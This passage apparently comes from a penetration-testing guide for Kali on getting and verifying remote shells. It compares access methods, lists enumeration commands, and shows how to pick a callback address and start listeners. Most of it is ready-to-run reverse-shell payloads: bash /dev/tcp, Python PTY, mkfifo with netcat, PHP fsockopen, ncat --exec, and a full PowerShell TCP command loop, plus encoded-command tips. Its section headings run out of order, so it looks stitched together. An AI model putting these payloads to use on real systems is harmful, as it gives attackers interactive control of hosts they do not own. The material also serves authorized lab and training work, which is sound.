controlled side effect | Network callback works | | Connection | Listener records the expected peer | Commands and I/O are usable | | Session | Commands return and host/identity are verified | Higher privilege or stability | Do not change all four layers at once. Preserve the last confirmed state and test the next boundary. | Situation | Prefer | Main prerequisite / limitation | | --- | --- | --- | | One bounded action is enough | Direct command execution | Observable output or side effect; no shell required | | Valid credential and remote service | SSH, WinRM or RDP | Authentication plus remote-logon authorization | | Target can reach Kali | Reverse shell | Target egress and a reachable Kali listener | | Kali can reach a target listener | Bind shell | Target can bind and inbound path permits it | | Payload is staged or protocol-aware | Matching framework handler | Handler must use the exact payload/transport | Prefer authenticated administrative access when it is already available: it is normally more stable, auditable and feature-complete than an improvised shell. Linux: ```bash id; hostname; pwd ``` Windows: ```cmd whoami & hostname & cd ``` For blind execution, use one bounded callback or file side effect that the current context can produce and you can independently observe. Do not interpret a hung HTTP request as proof of a shell; the server may simply be waiting on a child process or timeout. Linux: ```bash hostname; id; pwd ip addr; ip route ss -lntup ``` Windows: ```cmd hostname whoami /all cd ipconfig /all route print netstat -ano ``` Record the destination host, actual identity, privilege, current directory, interfaces/routes, parent/execution context and the exact command that produced the session. Then re-enumerate from the new state. ```text exact prerequisites → exploit reaches expected vulnerable path → bounded harmless effect or identity output → repeatable command execution → payload reaches listener → usable session → verified host/identity/privilege/network position ``` Do not accept the exploit's own “success” string as proof. Validate an independent effect. An HTTP `200`, uploaded filename, connection or application crash each proves less than a verified command result. ### 7. Discover and verify prerequisites ```bash command -v bash python3 php nc ip route get LHOST ``` ### 5. Why it works The target initiates the connection. The chosen LHOST must be reachable from that target, possibly through a pivot; shell syntax must survive every outer parser. ### 6. Execute and choose variants ```text trigger context → target process/interpreter and architecture → target source interface → route/egress controls → LHOST address visible from target → LPORT → local bind interface → listener/handler ``` Select `LHOST` from the target's point of view. A VPN address, tunnel endpoint or reachable interface may be correct while Kali's default-route address is wrong. On Kali: ```bash ip -brief address ip route ss -lntp ``` Windows source/listener checks: ```powershell Get-NetIPAddress -AddressFamily IPv4 Get-NetRoute -AddressFamily IPv4 Get-NetTCPConnection -State Listen ``` Traditional/OpenBSD-style `nc` commonly used on Kali: ```bash rlwrap nc -lvnp LPORT ``` Nmap Ncat uses a positional listen port; do not mechanically copy every `nc` flag: ```bash ncat -4 -lvn 0.0.0.0 LPORT ``` Verify the bind in another terminal: ```bash ss -lntp | grep ':LPORT' ``` If multiple interfaces exist, bind deliberately: ```bash ncat -4 -lvn LHOST LPORT ``` > **Failure cue:** a listener bound only to `127.0.0.1`, the wrong VPN/interface address or the wrong address family cannot receive the expected callback. “Address already in use” means another process owns the bind. Choose an interpreter that you confirmed exists. Bash TCP: ```bash bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' ``` Python 3 with a PTY: ```bash python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' ``` Portable FIFO plus Netcat when `-e` is absent: ```bash rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT >/tmp/f ``` PHP CLI: ```bash php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' ```
Variant — target has Ncat command execution Linux: ```bash ncat LHOST LPORT --exec /bin/sh ``` Windows: ```cmd ncat.exe LHOST LPORT --exec cmd.exe ``` `--exec` exposes the named program directly to the network connection. Use only on the assigned host and remove transferred tooling when the exercise requires cleanup.
> **Shell-language cue:** a command injection may execute through `/bin/sh`, which does not understand every Bash construct. Wrap Bash-specific syntax in `bash -c '...'` and then encode it for the outer HTTP/template/database layer. ### 7. Why it works Authenticated WinRM/RDP/SSH can be simpler than an injected callback. A basic PowerShell TCP loop is a command stream rather than a full terminal; encoding fixes parser transport, not authorization or endpoint controls. ### 6. Execute and choose variants Prefer an available authenticated service: ```bash evil-winrm -i TARGET -u USER -p 'PASSWORD' xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore ssh -p PORT USER@TARGET ``` PowerShell TCP shell when direct command execution is the only primitive: ```powershell $client = [Net.Sockets.TcpClient]::new('LHOST',LPORT) $stream = $client.GetStream() $buffer = New-Object byte[] 65535 while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) { $command = [Text.Encoding]::ASCII.GetString($buffer,0,$count) $output = (Invoke-Expression $command 2>&1 | Out-String) + "PS $((Get-Location).Path)> " $bytes = [Text.Encoding]::ASCII.GetBytes($output) $stream.Write($bytes,0,$bytes.Length) $stream.Flush() } $client.Close() ``` > This is a basic command channel, not a ConPTY. Host policy, language mode, AMSI/antimalware, quoting and the parent process can affect it. PowerShell `-EncodedCommand` solves nested quoting; it is not encryption or an AV bypass. Generate UTF-16LE Base64 locally: ```powershell $command = 'COMMAND' $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)) $encoded ``` Invoke in the target command context: ```cmd powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE ``` ### 7.
